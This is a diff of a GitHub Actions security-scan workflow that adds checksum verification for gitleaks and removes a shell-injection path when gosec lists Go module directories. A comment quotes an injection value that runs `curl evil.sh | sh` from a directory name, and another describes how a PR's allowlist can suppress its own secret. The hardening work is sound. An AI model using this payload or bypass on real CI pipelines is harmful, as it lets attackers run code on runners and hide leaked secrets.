@@ -23,6 +23,14 @@ name: security-scan
 # repointed upstream at any time, which silently changes executable CI code
 # without anything appearing in this repository's review history.
 #
+# ACCEPTED RISK, stated so nobody assumes otherwise: gitleaks reads
+# `.gitleaks.toml` from the checked-out tree, so a pull request can ship an
+# allowlist that suppresses its own secret and the blocking gate will pass.
+# The compensating control is that the secret is then sitting in that PR's own
+# diff, in a file whose entire purpose is suppression, for a human to see at
+# review time. GitHub Advanced Security had exactly the same property. Treat a
+# PR that touches .gitleaks.toml as security-relevant and read the entry.
+#
 # Enforcement is split on purpose, based on what each scanner actually found at
 # rollout:
 #   gitleaks -- BLOCKING. Zero findings in the tracked history of every repo, so
@@ -58,6 +66,10 @@ permissions:
 
 env:
   GITLEAKS_VERSION: '8.30.1'
+  # sha256 of gitleaks_8.30.1_linux_x64.tar.gz from the upstream checksums file.
+  # The blocking gate is only as trustworthy as the binary enforcing it; without
+  # this we would curl and execute whatever the URL served.
+  GITLEAKS_SHA256: '551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb'
   SEMGREP_VERSION: '1.176.1'
   GOSEC_VERSION: 'v2.29.0'
 
@@ -82,6 +94,7 @@ jobs:
           set -euo pipefail
           curl -fsSL -o /tmp/gitleaks.tar.gz \
             "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
+          echo "${GITLEAKS_SHA256}  /tmp/gitleaks.tar.gz" | sha256sum -c -
           tar -xzf /tmp/gitleaks.tar.gz -C /tmp gitleaks
           sudo install -m 0755 /tmp/gitleaks /usr/local/bin/gitleaks
           gitleaks version
@@ -232,17 +245,28 @@ jobs:
         id: detect
         run: |
           set -euo pipefail
-          DIRS=$(find . -name go.mod -not -path '*/vendor/*' -not -path '*/node_modules/*' \
-                   -exec dirname {} \; | sort -u)
-          if [ -z "$DIRS" ]; then
+          # Paths are written NUL-delimited to a file rather than newline-
+          # delimited into GITHUB_OUTPUT. A repository-controlled directory name
+          # containing a newline would otherwise split into two bogus entries,
+          # and one containing a line reading `EOF` would close the heredoc
+          # early and let the rest be parsed as further step outputs. Only the
+          # fixed literals go=/first= are written to GITHUB_OUTPUT.
+          # GNU find only (-printf). The runner is always ubuntu-latest, so this
+          # is guaranteed; failing loudly beats a fallback that quietly
+          # mis-splits a path and under-reports coverage.
+          find . -name go.mod -not -path '*/vendor/*' -not -path '*/node_modules/*' \
+            -printf '%h\0' | sort -zu > /tmp/go-modules.z
+          if [ ! -s /tmp/go-modules.z ]; then
             echo "go=false" >> "$GITHUB_OUTPUT"
             echo "No go.mod found; skipping gosec." >> "$GITHUB_STEP_SUMMARY"
             exit 0
           fi
           echo "go=true" >> "$GITHUB_OUTPUT"
-          echo "first=$(echo "$DIRS" | head -1)" >> "$GITHUB_OUTPUT"
-          { echo 'dirs<<EOF'; echo "$DIRS"; echo 'EOF'; } >> "$GITHUB_OUTPUT"
-          echo "Go modules found:"; echo "$DIRS"
+          FIRST=$(tr '\0' '\n' < /tmp/go-modules.z | head -1)
+          # go-version-file is an action input, not shell, so this cannot become
+          # syntax; a hostile value can only make setup-go fail to find a file.
+          echo "first=$FIRST" >> "$GITHUB_OUTPUT"
+          echo "Go modules found:"; tr '\0' '\n' < /tmp/go-modules.z
 
       - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5
         if: steps.detect.outputs.go == 'true'
@@ -255,28 +279,25 @@ jobs:
 
       # One report per module, merged by the summary step. gosec cannot span
       # modules in a single invocation.
-      # The module list arrives through the ENVIRONMENT, never through a
-      # ${{ }} expression inside the script. GitHub substitutes expressions into
-      # the shell source as text before bash ever sees it, so a directory named
-      # `a"; curl evil.sh | sh; "` containing a go.mod would have been executed
-      # on the runner. This workflow triggers on `pull_request`, and
+      # Reads the NUL-delimited file written above. No ${{ }} expression appears
+      # anywhere in this script: GitHub substitutes expressions into the shell
+      # source as text before bash sees it, so a directory named
+      # `a"; curl evil.sh | sh; "` containing a go.mod would have executed on
+      # the runner. This workflow triggers on `pull_request` and
       # chaio-crewchief is public, so any fork could have opened that PR.
-      # Environment variables are passed as data and cannot become syntax.
       - name: Run gosec
         if: steps.detect.outputs.go == 'true'
         continue-on-error: true
-        env:
-          GO_MODULE_DIRS: ${{ steps.detect.outputs.dirs }}
         run: |
           set -uo pipefail
           i=0
-          while IFS= read -r d; do
+          while IFS= read -r -d "" d; do
             [ -z "$d" ] && continue
             echo "::group::gosec $d"
             ( cd "$d" && gosec -quiet -fmt=json -out="${GITHUB_WORKSPACE}/gosec-${i}.json" ./... )
             echo "::endgroup::"
             i=$((i + 1))
-          done <<< "$GO_MODULE_DIRS"
+          done < /tmp/go-modules.z
 
       - name: Summarise
         if: always() && steps.detect.outputs.go == 'true'
